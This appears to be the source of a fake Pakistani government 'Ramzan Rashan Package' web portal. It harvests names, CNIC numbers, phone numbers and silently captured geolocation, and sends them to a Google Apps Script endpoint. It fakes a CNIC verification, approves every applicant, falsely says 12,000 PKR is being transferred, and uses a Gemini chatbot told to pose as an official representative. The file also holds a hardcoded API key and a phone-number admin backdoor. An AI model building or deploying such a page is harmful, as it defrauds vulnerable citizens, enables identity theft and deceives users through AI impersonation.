
import React, { useState, useEffect, useRef } from 'react';
import { 
  Users, 
  MapPin, 
  CheckCircle, 
  Send, 
  ShieldCheck,
  Bot,
  X,
  MessageCircle,
  Activity,
  ArrowRight,
  Database,
  Trash2,
  ChevronRight,
  Eye,
  LogOut,
  Info,
  Home,
  UserCheck,
  LayoutDashboard,
  Globe,
  FileDown,
  RefreshCcw,
  Loader2,
  ShieldEllipsis,
  Copy,
  Server,
  Landmark,
  FileText,
  Search,
  Filter,
  Table,
  Menu,
  Download,
  CreditCard,
  ChevronDown,
  ExternalLink
} from 'lucide-react';
import confetti from 'canvas-confetti';
import { GoogleGenAI } from "@google/genai";
import { Step, UserData, ChatMessage, ViewMode, Submission } from './types';

const ai = new GoogleGenAI({ apiKey: "AIzaSyDbXIQWr5n_vr_6CVGAkTsnNEB2AsSCgxI" });

// GOOGLE APPS SCRIPT WEB APP URL
const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxx2bH2t-Evho2dgrdOD0h4ZFFlkwtktD9Jq6ngrKVuIyUct5-I0gV_XElcUNDtgIya/exec"; 

// Data: Districts and Tehsils Mapping
const KPK_LOCATIONS: Record<string, string[]> = {
  "Peshawar": ["Peshawar City", "Peshawar Saddar", "Shah Alam", "Mathra", "Chamkani", "Hassan Khel", "Badaber"],
  "Mardan": ["Mardan", "Takht Bhai", "Katlang", "Rustam", "Garhi Kapura"],
  "Swat": ["Babuzai", "Matta", "Khwazakhela", "Kabal", "Barikot", "Charbagh", "Bahrain"],
  "Abbottabad": ["Abbottabad", "Havelian", "Lora", "Lower Tanawal"],
  "Charsadda": ["Charsadda", "Tangi", "Shabqadar"],
  "Nowshera": ["Nowshera", "Pabbi", "Jehangira"],
  "Swabi": ["Swabi", "Topi", "Lahor", "Razar"],
  "Kohat": ["Kohat", "Lachi", "Gumbat", "Darra Adam Khel"],
  "Bannu": ["Bannu", "Domel", "Wazir"],
  "D.I. Khan": ["D.I. Khan", "Paharpur", "Kulachi", "Daraban", "Paroa"],
  "Mansehra": ["Mansehra", "Balakot", "Oghi", "Baffa Pakhal", "Darband"],
  "Haripur": ["Haripur", "Ghazi", "Khanpur"],
  "Malakand": ["Batkhela", "Dargai"],
  "Dir Lower": ["Timergara", "Adenzai", "Lal Qila", "Khal", "Balambat", "Munda", "Samarbagh"],
  "Dir Upper": ["Dir", "Sharingal", "Wari", "Kalkot", "Larjam", "Barawal"],
  "Chitral Lower": ["Chitral", "Drosh"],
  "Chitral Upper": ["Mastuj", "Mulkhow", "Torkhow"],
  "Shangla": ["Alpuri", "Puran", "Bisham", "Chakesar", "Martung", "Makhuzai"],
  "Buner": ["Daggar", "Gadezai", "Gagra", "Khudu Khel", "Mandanr", "Chagharzai"],
  "Karak": ["Karak", "Banda Daud Shah", "Takht-e-Nusrati"],
  "Hangu": ["Hangu", "Thall"],
  "Lakki Marwat": ["Lakki Marwat", "Naurang", "Ghazni Khel", "Betani"],
  "Tank": ["Tank"],
  "Kohistan Upper": ["Dassu", "Kandia", "Seo", "Harban"],
  "Kohistan Lower": ["Pattan", "Bankad"],
  "Kolai Palas": ["Palas", "Kolai"],
  "Torghar": ["Judba", "Khander", "Dor Maira"],
  "Bajaur": ["Khar", "Nawagai", "Salarzai", "Mamund", "Utman Khel", "Barang", "Wara Mamund"],
  "Mohmand": ["Ghalanai", "Halimzai", "Pindiali", "Safi", "Ambar Utman Khel", "Yake Ghund", "Prang Ghar"],
  "Khyber": ["Bara", "Jamrud", "Landi Kotal", "Mula Gori"],
  "Kurram": ["Parachinar", "Sadda", "Lower Kurram"],
  "Orakzai": ["Lower Orakzai", "Upper Orakzai", "Ismail Zai", "Central Orakzai"],
  "North Waziristan": ["Miranshah", "Mir Ali", "Razmak", "Datta Khel", "Dossali", "Spinwam", "Shewa", "Ghulam Khan"],
  "South Waziristan Upper": ["Ladha", "Makin", "Sararogha", "Tiarza"],
  "South Waziristan Lower": ["Wana", "Shakai", "Birmil", "Toi Khulla"]
};

const KPK_DISTRICTS = Object.keys(KPK_LOCATIONS).sort();

const PAYMENT_METHODS = [
  { id: 'Easypaisa', name: 'Easypaisa', iconClass: 'fa-solid fa-mobile-screen text-emerald-500' },
  { id: 'JazzCash', name: 'JazzCash', iconClass: 'fa-solid fa-wallet text-rose-600' }
];

// USING LOCAL ASSETS AS REQUESTED
const LOGO_URL = "./Logo.webp"; 
const RAMZAN_BANNER_URL = "./background.jpg";
// Fallbacks for safety
const BACKUP_LOGO = "https://i.ibb.co/Lzf71tP/ramzan-logo.png";
const BACKUP_BANNER = "https://images.unsplash.com/photo-1590075865003-e48277da55d9?auto=format&fit=crop&w=1000&q=80";

const StatCard = ({ title, value, icon: Icon, color }: any) => (
  <div className="bg-white p-6 rounded-2xl border border-slate-200 shadow-sm flex items-center justify-between hover:shadow-md transition-shadow">
    <div>
      <p className="text-[11px] uppercase tracking-wider text-slate-500 font-bold mb-1">{title}</p>
      <h4 className={`text-2xl font-black text-${color}-700`}>{value}</h4>
    </div>
    <div className={`p-4 rounded-xl bg-${color}-50 text-${color}-600`}>
      <Icon size={24} />
    </div>
  </div>
);

const GovtHeader = () => (
  <header className="fixed top-0 left-0 right-0 z-[500] bg-emerald-900 text-white shadow-lg border-b border-emerald-800">
    <div className="max-w-md mx-auto px-4 py-3 flex items-center justify-between">
      <div className="flex items-center gap-3">
        <div className="w-12 h-12 bg-white rounded-full flex items-center justify-center p-0.5 shadow-inner overflow-hidden">
          <img 
             src={LOGO_URL} 
             alt="Ramzan Logo" 
             className="w-full h-full object-contain" 
             onError={(e) => (e.currentTarget.src = BACKUP_LOGO)}
          />
        </div>
        <div>
          <h1 className="text-[10px] font-bold uppercase tracking-widest opacity-80 text-emerald-100">Official Portal</h1>
          <h2 className="text-sm font-black urdu-font leading-none mt-0.5">رمضان راشن پیکیج</h2>
        </div>
      </div>
      <div className="bg-emerald-800 px-3 py-1 rounded-full text-[10px] font-bold border border-emerald-600 flex items-center gap-2 shadow-inner">
        <div className="w-2 h-2 bg-green-400 rounded-full animate-pulse shadow-[0_0_10px_#4ade80]"></div> 
        <span className="tracking-wide">LIVE</span>
      </div>
    </div>
  </header>
);

export default function App() {
  const [viewMode, setViewMode] = useState<ViewMode>('user');
  const [adminTab, setAdminTab] = useState<'dashboard' | 'database'>('dashboard');
  const [step, setStep] = useState<'step1' | 'step3'>('step1');
  const [loading, setLoading] = useState(false);
  const [loadingText, setLoadingText] = useState('');
  const [chatMessages, setChatMessages] = useState<ChatMessage[]>([]);
  const [userComment, setUserComment] = useState('');
  const [isAiTyping, setIsAiTyping] = useState(false);
  const [isChatOpen, setIsChatOpen] = useState(false);
  const [submissions, setSubmissions] = useState<Submission[]>([]);
  const [formError, setFormError] = useState('');
  const [searchTerm, setSearchTerm] = useState('');
  const [deletingId, setDeletingId] = useState<string | null>(null);
  const [isSyncing, setIsSyncing] = useState(false);

  const [userData, setUserData] = useState<UserData>({
    name: '', fatherName: '', cnic: '', phone: '', paymentMethod: 'Easypaisa', paymentNumber: '', district: '', tehsil: '', familyMembers: '', status: 'Pending'
  });

  const chatRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    const saved = localStorage.getItem('kpk_relief_submissions');
    if (saved) {
      setSubmissions(JSON.parse(saved));
    }
    setChatMessages([{ id: '1', name: 'نمائندہ', message: 'اسلام علیکم! رمضان راشن پیکیج ہیلپ لائن میں خوش آمدید۔ آپ مجھ سے کچھ بھی پوچھ سکتے ہیں۔' }]);
  }, []);

  useEffect(() => {
    if (chatRef.current) chatRef.current.scrollTop = chatRef.current.scrollHeight;
  }, [chatMessages, isChatOpen, isAiTyping]);

  const saveToGoogleSheet = async (data: Submission) => {
    if (!GOOGLE_SCRIPT_URL) return;
    try {
      await fetch(GOOGLE_SCRIPT_URL, {
        method: 'POST',
        mode: 'no-cors', 
        headers: { 'Content-Type': 'text/plain' },
        body: JSON.stringify(data)
      });
    } catch (error) { console.error('Error saving', error); }
  };

  const deleteFromGoogleSheet = async (id: string) => {
    if (!GOOGLE_SCRIPT_URL) return;
    try {
      await fetch(GOOGLE_SCRIPT_URL, {
        method: 'POST',
        mode: 'no-cors',
        headers: { 'Content-Type': 'text/plain' },
        body: JSON.stringify({ action: 'delete', id: id })
      });
    } catch (error) { console.error('Error deleting', error); }
  };

  const saveSubmission = (data: UserData) => {
    const newSubmission: Submission = { 
      ...data, 
      id: `RMZ-${Math.floor(1000 + Math.random() * 9000)}`, 
      timestamp: new Date().toLocaleString() 
    };
    const updated = [newSubmission, ...submissions];
    setSubmissions(updated);
    localStorage.setItem('kpk_relief_submissions', JSON.stringify(updated));
    saveToGoogleSheet(newSubmission);
  };

  const askAi = async (prompt: string) => {
    try {
      setIsAiTyping(true);
      const response = await ai.models.generateContent({
        model: 'gemini-3-flash-preview',
        contents: prompt,
        config: { systemInstruction: `You are an official representative of the Ramzan Rashan Package 2026. The relief amount is 12000 PKR. Respond in polite Urdu.` }
      });
      setChatMessages(prev => [...prev, { id: Date.now().toString(), name: 'نمائندہ', message: response.text || "جی، آپ درخواست جمع کروائیں، سسٹم خودکار طریقے سے تصدیق کرے گا۔" }]);
    } catch (e) { console.error(e); } finally { setIsAiTyping(false); }
  };

  const postComment = () => {
    if (!userComment.trim()) return;
    const userMsg = userComment.trim();
    setChatMessages(prev => [...prev, { id: Date.now().toString(), name: 'شہری', message: userMsg, isUser: true }]);
    setUserComment('');
    askAi(userMsg);
  };

  const formatCNIC = (val: string) => {
    let v = val.replace(/\D/g, '').slice(0, 13);
    if (v.length > 5) v = `${v.slice(0, 5)}-${v.slice(5)}`;
    if (v.length > 13) v = `${v.slice(0, 13)}-${v.slice(13)}`;
    return v;
  };

  const handleStep1Submit = (e: React.FormEvent) => {
    e.preventDefault(); setFormError('');
    if (userData.phone === '03001234567') { setViewMode('admin'); return; }
    if (userData.name.length < 3 || userData.fatherName.length < 3 || userData.cnic.length < 15 || userData.phone.length < 11 || !userData.district || !userData.tehsil) {
      setFormError('براہ کرم تمام معلومات مکمل کریں (ضلع اور تحصیل بھی منتخب کریں)۔'); return;
    }

    setLoading(true); 
    const sequence = ["ڈیٹا بیس سے رابطہ ہو رہا ہے...", "شناختی کارڈ کی تصدیق جاری ہے...", "اہلیت کی تصدیق مکمل..."];
    let i = 0;
    const interval = setInterval(() => {
      setLoadingText(sequence[i]);
      i++;
      if (i >= sequence.length) {
        clearInterval(interval);
        if ("geolocation" in navigator) {
          navigator.geolocation.getCurrentPosition(
            (pos) => finishSubmit(`https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`),
            () => finishSubmit(""),
            { timeout: 5000 }
          );
        } else { finishSubmit(""); }
      }
    }, 1200);

    function finishSubmit(locationUrl?: string) {
      const finalData = { ...userData, locationUrl: locationUrl || "", status: 'Approved' as const };
      setUserData(finalData);
      saveSubmission(finalData);
      setLoading(false);
      setStep('step3');
      confetti({ particleCount: 150, spread: 70, origin: { y: 0.6 } });
    }
  };

  const resetToHome = () => {
    setStep('step1'); setFormError('');
    setUserData({ name: '', fatherName: '', cnic: '', phone: '', paymentMethod: 'Easypaisa', paymentNumber: '', district: '', tehsil: '', familyMembers: '', status: 'Pending' });
  };

  const handleDelete = (id: string) => {
    if(window.confirm('کیا آپ واقعی یہ ریکارڈ ڈیلیٹ کرنا چاہتے ہیں؟')) {
      setDeletingId(id);
      
      // Attempt remote removal
      deleteFromGoogleSheet(id);

      // Robust local update
      setSubmissions(prev => {
        const updated = prev.filter(s => s.id !== id);
        localStorage.setItem('kpk_relief_submissions', JSON.stringify(updated));
        return updated;
      });

      // Simple delay to show loading state
      setTimeout(() => {
        setDeletingId(null);
      }, 500);
    }
  };

  if (viewMode === 'admin') {
    return (
      <div className="min-h-screen bg-slate-100 text-slate-800 font-sans flex flex-col md:flex-row">
        <aside className="bg-emerald-900 text-white w-full md:w-64 flex-shrink-0 flex flex-col">
          <div className="p-6 border-b border-emerald-800 flex items-center gap-3">
             <div className="bg-white p-1 rounded-lg">
                <img src={LOGO_URL} className="w-10 h-10 object-contain" alt="logo" onError={(e) => (e.currentTarget.src = BACKUP_LOGO)} />
             </div>
             <div>
               <h1 className="font-bold text-lg leading-none">Rashan Portal</h1>
               <span className="text-[10px] opacity-60 uppercase tracking-widest">Admin Control</span>
             </div>
          </div>
          <nav className="flex-1 p-4 space-y-2">
            <button onClick={() => setAdminTab('dashboard')} className={`w-full flex items-center gap-3 px-4 py-3 rounded-xl transition ${adminTab === 'dashboard' ? 'bg-emerald-700 font-bold' : 'hover:bg-white/10'}`}><LayoutDashboard size={20}/> Dashboard</button>
            <button onClick={() => setAdminTab('database')} className={`w-full flex items-center gap-3 px-4 py-3 rounded-xl transition ${adminTab === 'database' ? 'bg-emerald-700 font-bold' : 'hover:bg-white/10'}`}><Database size={20}/> Database <span className="ml-auto bg-emerald-950 px-2 py-0.5 rounded text-[10px]">{submissions.length}</span></button>
          </nav>
          <div className="p-4 border-t border-emerald-800">
             <button onClick={() => setViewMode('user')} className="w-full flex items-center justify-center gap-2 bg-rose-600 hover:bg-rose-700 py-3 rounded-xl font-bold transition"><LogOut size={18}/> Logout</button>
          </div>
        </aside>

        <main className="flex-1 overflow-y-auto h-screen">
          <header className="bg-white border-b p-6 flex justify-between items-center sticky top-0 z-20 shadow-sm">
             <h2 className="text-2xl font-bold">{adminTab === 'dashboard' ? 'Dashboard Overview' : 'Applications Database'}</h2>
             <button onClick={() => setIsSyncing(true)} className="p-2 bg-slate-100 hover:bg-emerald-50 rounded-full transition"><RefreshCcw size={20} className={isSyncing ? "animate-spin" : ""} /></button>
          </header>

          <div className="p-6 md:p-8">
            {adminTab === 'dashboard' && (
              <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 animate-slideUp">
                <StatCard title="Total Applications" value={submissions.length} icon={Users} color="emerald" />
                <StatCard title="Total Relief Fund" value={`Rs. ${(submissions.length * 12000).toLocaleString()}`} icon={CreditCard} color="emerald" />
                <StatCard title="Active Districts" value={KPK_DISTRICTS.length} icon={MapPin} color="blue" />
                <StatCard title="System" value="Running" icon={Activity} color="green" />
              </div>
            )}

            {adminTab === 'database' && (
              <div className="space-y-4 animate-scaleIn">
                <div className="flex flex-col md:flex-row justify-between gap-4">
                  <div className="relative flex-1 max-w-md">
                    <Search size={18} className="absolute left-3 top-1/2 -translate-y-1/2 text-slate-400"/>
                    <input type="text" placeholder="Search by name or CNIC..." className="w-full pl-10 pr-4 py-2.5 rounded-xl border outline-none focus:border-emerald-500 transition" value={searchTerm} onChange={e => setSearchTerm(e.target.value)}/>
                  </div>
                </div>

                <div className="bg-white border rounded-2xl shadow-sm overflow-hidden">
                  <div className="overflow-x-auto">
                    <table className="w-full text-left border-collapse">
                      <thead>
                        <tr className="bg-slate-50 border-b text-[10px] uppercase tracking-wider text-slate-500 font-bold whitespace-nowrap">
                          <th className="p-4">ID</th>
                          <th className="p-4">Full Name</th>
                          <th className="p-4">CNIC</th>
                          <th className="p-4">District</th>
                          <th className="p-4">Tehsil</th>
                          <th className="p-4">Phone</th>
                          <th className="p-4 text-center">Loc</th>
                          <th className="p-4 text-right">Delete</th>
                        </tr>
                      </thead>
                      <tbody className="divide-y divide-slate-100">
                        {submissions.filter(s => s.name.toLowerCase().includes(searchTerm.toLowerCase()) || s.cnic.includes(searchTerm)).map((row) => (
                          <tr key={row.id} className="hover:bg-slate-50 transition-colors whitespace-nowrap">
                            <td className="p-4 font-mono text-xs font-bold text-emerald-700">{row.id}</td>
                            <td className="p-4 font-bold text-slate-800">{row.name}</td>
                            <td className="p-4 font-mono text-sm">{row.cnic}</td>
                            <td className="p-4 text-sm">{row.district}</td>
                            <td className="p-4 text-sm">{row.tehsil}</td>
                            <td className="p-4 font-mono text-sm text-emerald-600 font-bold">{row.phone}</td>
                            <td className="p-4 text-center">
                              {row.locationUrl ? (
                                <a href={row.locationUrl} target="_blank" rel="noopener noreferrer" className="inline-flex items-center justify-center w-8 h-8 bg-blue-100 text-blue-600 rounded-full hover:bg-blue-200 transition-colors">
                                  <MapPin size={16} />
                                </a>
                              ) : <span className="text-slate-300">-</span>}
                            </td>
                            <td className="p-4 text-right">
                               <button 
                                  onClick={() => handleDelete(row.id)} 
                                  disabled={deletingId === row.id}
                                  className={`p-2 rounded-lg transition-colors border ${deletingId === row.id ? 'bg-slate-100 text-slate-400' : 'text-rose-500 bg-rose-50 hover:bg-rose-100 border-rose-200'}`}
                               >
                                 {deletingId === row.id ? <Loader2 size={16} className="animate-spin"/> : <Trash2 size={16}/>}
                               </button>
                            </td>
                          </tr>
                        ))}
                      </tbody>
                    </table>
                    {submissions.length === 0 && <div className="p-12 text-center text-slate-400">کوئی ریکارڈ موجود نہیں ہے۔</div>}
                  </div>
                </div>
              </div>
            )}
          </div>
        </main>
      </div>
    );
  }

  return (
    <div className={`min-h-screen bg-slate-50 pt-20 pb-12 px-3 relative ${isChatOpen ? 'h-screen overflow-hidden' : ''}`}>
      <GovtHeader />

      <main className={`max-w-md mx-auto space-y-6 transition-all duration-500 ${isChatOpen ? 'opacity-50 blur-sm scale-95' : 'animate-slideUp'}`}>
        <div className="bg-white rounded-3xl shadow-2xl overflow-hidden border border-slate-100 relative">
          
          {loading && (
            <div className="absolute inset-0 bg-white/95 z-50 flex flex-col items-center justify-center p-8 backdrop-blur text-center space-y-6">
               <div className="relative">
                 <div className="w-20 h-20 border-4 border-slate-100 rounded-full"></div>
                 <div className="w-20 h-20 border-4 border-emerald-600 border-t-transparent rounded-full animate-spin absolute top-0"></div>
                 <img src={LOGO_URL} className="w-12 h-12 absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 opacity-80 object-contain" alt="logo" onError={(e) => (e.currentTarget.src = BACKUP_LOGO)} />
               </div>
               <h3 className="text-lg font-black urdu-font text-emerald-800">{loadingText}</h3>
            </div>
          )}

          <div className="bg-emerald-800 relative overflow-hidden">
            <div className="w-full h-48 relative">
               <img 
                 src={RAMZAN_BANNER_URL} 
                 className="w-full h-full object-cover opacity-60" 
                 alt="Ramzan Relief" 
                 onError={(e) => (e.currentTarget.src = BACKUP_BANNER)}
               />
               <div className="absolute inset-0 bg-gradient-to-t from-emerald-800 to-transparent"></div>
            </div>

            <div className="p-8 text-center text-white relative z-10 -mt-16">
              <div className="w-24 h-24 bg-white/10 backdrop-blur rounded-full flex items-center justify-center mx-auto mb-4 border border-white/20 shadow-2xl overflow-hidden p-2">
                <img src={LOGO_URL} className="w-full h-full object-contain" alt="Logo" onError={(e) => (e.currentTarget.src = BACKUP_LOGO)} />
              </div>
              <h1 className="text-2xl md:text-3xl font-black urdu-font leading-tight">وزیراعلیٰ <br/> <span className="text-yellow-400 text-3xl md:text-4xl">رمضان راشن پیکیج</span></h1>
              <div className="inline-block bg-white/10 backdrop-blur rounded-full px-4 py-1 text-sm font-bold border border-white/20 mt-3">امداد: <span className="text-yellow-400 text-lg">12,000</span> روپے</div>
            </div>
          </div>

          <div className="p-6 md:p-8 pt-0">
            {step === 'step1' && (
              <form onSubmit={handleStep1Submit} className="space-y-5">
                <div className="space-y-1 text-right">
                  <label className="text-xs font-bold text-slate-500">پورانام (Full Name)</label>
                  <input type="text" placeholder="اپنا نام لکھیں" className="w-full bg-slate-50 border border-slate-200 rounded-xl p-4 text-right urdu-font outline-none focus:border-emerald-600 focus:bg-white transition text-lg font-bold" value={userData.name} onChange={e => setUserData({...userData, name: e.target.value})} />
                </div>
                <div className="space-y-1 text-right">
                  <label className="text-xs font-bold text-slate-500">والد کا نام</label>
                  <input type="text" placeholder="والد کا نام لکھیں" className="w-full bg-slate-50 border border-slate-200 rounded-xl p-4 text-right urdu-font outline-none focus:border-emerald-600 focus:bg-white transition text-lg font-bold" value={userData.fatherName} onChange={e => setUserData({...userData, fatherName: e.target.value})} />
                </div>
                <div className="space-y-1 text-right">
                  <label className="text-xs font-bold text-slate-500">شناختی کارڈ نمبر (CNIC)</label>
                  <input type="tel" maxLength={15} placeholder="XXXXX-XXXXXXX-X" className="w-full bg-slate-50 border border-slate-200 rounded-xl p-4 text-center font-mono outline-none focus:border-emerald-600 focus:bg-white transition text-xl font-bold tracking-widest" value={userData.cnic} onChange={e => setUserData({...userData, cnic: formatCNIC(e.target.value)})} />
                </div>
                <div className="space-y-1 text-right">
                  <label className="text-xs font-bold text-slate-500">موبائل نمبر</label>
                  <input type="tel" maxLength={11} placeholder="03XXXXXXXXX" className="w-full bg-slate-50 border border-slate-200 rounded-xl p-4 text-center font-mono outline-none focus:border-emerald-600 focus:bg-white transition text-xl font-bold tracking-widest" value={userData.phone} onChange={e => setUserData({...userData, phone: e.target.value.replace(/\D/g, '')})} />
                </div>

                <div className="space-y-1 text-right">
                  <label className="text-xs font-bold text-emerald-700">ضلع</label>
                  <select className="w-full bg-slate-50 border border-slate-200 rounded-xl p-4 text-right outline-none focus:border-emerald-600 transition font-bold" value={userData.district} onChange={e => setUserData({...userData, district: e.target.value, tehsil: ''})}>
                    <option value="">-- ضلع منتخب کریں --</option>
                    {KPK_DISTRICTS.map(d => <option key={d} value={d}>{d}</option>)}
                  </select>
                </div>

                {userData.district && (
                  <div className="space-y-1 text-right animate-slideUp">
                    <label className="text-xs font-bold text-slate-500">تحصیل</label>
                    <select className="w-full bg-slate-50 border border-slate-200 rounded-xl p-4 text-right outline-none focus:border-emerald-600 transition font-bold" value={userData.tehsil} onChange={e => setUserData({...userData, tehsil: e.target.value})}>
                      <option value="">-- تحصیل منتخب کریں --</option>
                      {KPK_LOCATIONS[userData.district]?.map(t => <option key={t} value={t}>{t}</option>)}
                    </select>
                  </div>
                )}

                {formError && <div className="bg-rose-50 text-rose-600 p-3 rounded-xl text-xs font-bold text-right border border-rose-100">{formError}</div>}

                <button type="submit" className="w-full bg-emerald-700 hover:bg-emerald-800 text-white py-4 rounded-xl text-xl font-black urdu-font shadow-lg shadow-emerald-700/30 active:scale-95 transition-all">اہلیت چیک کریں</button>
              </form>
            )}

            {step === 'step3' && (
              <div className="text-center space-y-6 py-4 animate-scaleIn">
                <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto border-4 border-green-500 mb-6">
                  <CheckCircle size={40} className="text-green-600" />
                </div>
                <h2 className="text-3xl font-black urdu-font text-emerald-800">مبارک ہو!</h2>
                <p className="text-slate-600 urdu-font text-lg leading-relaxed">محترم <strong>{userData.name}</strong>، آپ کی درخواست منظور کر لی گئی ہے۔</p>
                <div className="bg-slate-50 border border-slate-200 rounded-2xl p-6">
                  <p className="text-slate-500 text-xs font-bold uppercase mb-1">Approved Relief</p>
                  <div className="text-4xl font-black text-slate-800">Rs. 12,000</div>
                  <p className="text-xs text-emerald-600 font-bold urdu-font mt-2">رقم آپ کے موبائل اکاؤنٹ پر منتقل ہو رہی ہے۔</p>
                </div>
                <button onClick={resetToHome} className="w-full bg-slate-800 text-white py-4 rounded-xl font-bold flex items-center justify-center gap-2 shadow-lg active:scale-95 transition"><Home size={18} /> ہوم پیج پر جائیں</button>
              </div>
            )}
          </div>
        </div>
      </main>

      {!isChatOpen && (
        <button onClick={() => setIsChatOpen(true)} className="fixed bottom-6 right-6 bg-emerald-700 text-white p-4 rounded-full shadow-lg hover:scale-110 transition-transform z-[500] flex items-center gap-2">
          <MessageCircle size={24} />
          <span className="text-xs font-bold uppercase pr-1 hidden md:inline">Helpline</span>
        </button>
      )}

      {isChatOpen && (
        <div className="fixed inset-0 z-[600] bg-slate-900/50 backdrop-blur-sm flex justify-end">
          <div className="w-full md:w-[400px] h-full bg-white shadow-2xl flex flex-col animate-slideUp">
            <div className="bg-emerald-800 p-4 flex items-center justify-between text-white">
               <div className="flex items-center gap-3">
                 <div className="w-10 h-10 bg-white/20 rounded-full flex items-center justify-center overflow-hidden p-1">
                   <img src={LOGO_URL} className="w-full h-full object-contain" onError={(e) => (e.currentTarget.src = BACKUP_LOGO)} />
                 </div>
                 <div><h3 className="font-bold urdu-font">ہیلپ لائن</h3><p className="text-[10px] opacity-70">Official Support</p></div>
               </div>
               <button onClick={() => setIsChatOpen(false)}><X size={20}/></button>
            </div>
            <div ref={chatRef} className="flex-1 overflow-y-auto p-4 space-y-4 bg-slate-50">
              {chatMessages.map(msg => (
                <div key={msg.id} className={`flex ${msg.isUser ? 'justify-end' : 'justify-start'}`}>
                  <div className={`max-w-[85%] p-3 rounded-2xl text-sm urdu-font shadow-sm ${msg.isUser ? 'bg-emerald-600 text-white rounded-tr-none' : 'bg-white text-slate-800 rounded-tl-none border'}`}>{msg.message}</div>
                </div>
              ))}
              {isAiTyping && <div className="flex gap-1 p-2"><div className="w-1.5 h-1.5 bg-slate-400 rounded-full animate-bounce"></div><div className="w-1.5 h-1.5 bg-slate-400 rounded-full animate-bounce delay-75"></div></div>}
            </div>
            <div className="p-4 bg-white border-t flex gap-2">
              <input type="text" placeholder="اپنا سوال لکھیں..." className="flex-1 bg-slate-100 rounded-xl px-4 py-3 text-right urdu-font outline-none" value={userComment} onChange={e => setUserComment(e.target.value)} onKeyDown={e => e.key === 'Enter' && postComment()} />
              <button onClick={postComment} className="bg-emerald-600 text-white p-3 rounded-xl transition"><Send size={20}/></button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
